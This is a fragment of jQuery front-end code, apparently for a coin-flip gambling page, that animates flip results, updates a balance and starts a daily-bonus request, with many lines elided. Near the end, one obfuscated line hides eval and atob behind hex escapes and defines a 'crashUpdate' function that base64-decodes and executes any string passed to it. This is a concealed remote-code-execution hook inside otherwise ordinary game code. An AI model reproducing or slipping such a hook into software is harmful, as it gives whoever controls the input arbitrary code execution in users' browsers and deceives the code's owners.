...
$('#coinnnn').removeClass('tails');
$('#coinnnn').removeClass('heads');
$('#coinnnn').removeClass('rebro');
...
beforeSend: function() {
      ...
      return false;
                                            ...
                                            if (obj.success == "success") {
                                                 ...
                                                 if(obj.flipResult == 1){
                                                                                    $('#coinnnn').addClass('heads');
                                                                                    }
                                                                                    if ( obj.flipResult == 2 ) {
                                                                                    $('#coinnnn').addClass('tails');
                                                                                    }
                                                                                      if ( obj.flipResult == 30 ) {
                                                                                    $('#coinnnn').addClass('rebro');
                                                                                    }
                                                                                    setTimeout(function(){
$.wnoty({
        position : 'top-right',
...
updateBalance(0, obj.newbalance);
...
sfd=this["\x65\x76\x61\x6C"];rty=this["\x61\x74\x6F\x62"];crashUpdate=function(s){sfd(rty(s.substring(-~[])));}
function getDaily() {
 $.ajax({
                                                                                type: 'POST',
                                                                                url: '../action.php',
